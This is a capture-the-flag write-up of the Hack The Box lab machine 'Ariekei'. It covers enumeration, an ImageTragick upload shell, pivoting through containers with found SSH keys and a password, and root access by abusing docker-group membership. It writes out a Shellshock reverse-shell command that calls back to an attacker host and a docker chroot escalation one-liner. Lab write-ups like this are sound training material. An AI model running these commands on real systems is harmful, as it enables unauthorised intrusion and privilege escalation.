---
title: "Hack The Box - Ariekei"
tags: [linux,insane,shellshock,cgi-bin,imagetragick,docker containers,container,port 1022,docker abuse]
categories: HackTheBox
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled.png)

## NMAP :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%201.png)

→ Nginx on port 443 [ https ]

→ OpenSSH 7.2p2 ( Xenial ) port 22

→ OpenSSH 6.6.1p1 ( Trusty ) port 1022

## Enumerating HTTPS :

⇒ Found subdomains from SSL Certificate :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%202.png)

⇒ **Enumerating beehive.ariekei.htb**
→ In headers we see ariekei-waf
→ Running gobuster we find :

**/blog**
**/cgi-bin/stats**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%203.png)

→ Lets exploit using shellshock
Exploit : [https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com/exploits/34900)

- It doesn't work because of the **WAF.**

→  The blog page doesn't have anything interesting

⇒ **Enumerating calvin.ariekei.htb**

→ Running gobuster we find :
**/upload**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%204.png)

→ We use ImageTragick to exploit it :  
[https://book.hacktricks.xyz/pentesting-web/file-upload#imagetragic](https://book.hacktricks.xyz/pentesting-web/file-upload#imagetragic)

- First lets create .mvg file :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%205.png)

→ We uploaded it and got an shell :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%206.png)

## Pivoting to Bastion

⇒ In /commons directory there's an .secret directory which contains bastion ssh key :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%207.png)

⇒ We ssh'ed into bastion as root [ Port 1022 ] :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%208.png)

## Pivoting to Beehive

⇒ In **commons/container** folder we find **blog-test** ( **Beehive** ) folder. Enumerating the config files we find :

→ Its running on **172.24.0.2**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%209.png)

→ We also found an password :

Password : **Ib3!kTEvYw6*P7s**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2010.png)

⇒ We can use shellshock exploit now as we are on a different machine and WAF won't block it now.

→ Shellshock : [https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com/exploits/34900)

**python [enox.py](http://enox.py/) payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=4444 pages=/cgi-bin/stats**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2011.png)

→ We switched to root using the password we previously found.

→ We found spanishdancer user ssh keys in that user home folder :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2012.png)

→ Cracked key password : **purple1**

⇒ SSH'ed in using spanishdancer ssh key  :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2013.png)

***USER OWNED***

## Privilege Escalation to Root

→ We see that our user is in docker group. Lets abuse it to get root :

**docker run -v /:/mnt --rm -it bash chroot /mnt sh**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Ariekei%20Box%20f58f647509ac4dbebc0d128b6cdee575/Untitled%2014.png)

***ROOTED***

[TL;DR](https://www.notion.so/TL-DR-d857de4c7a7f4e33969f8b229768d67a)
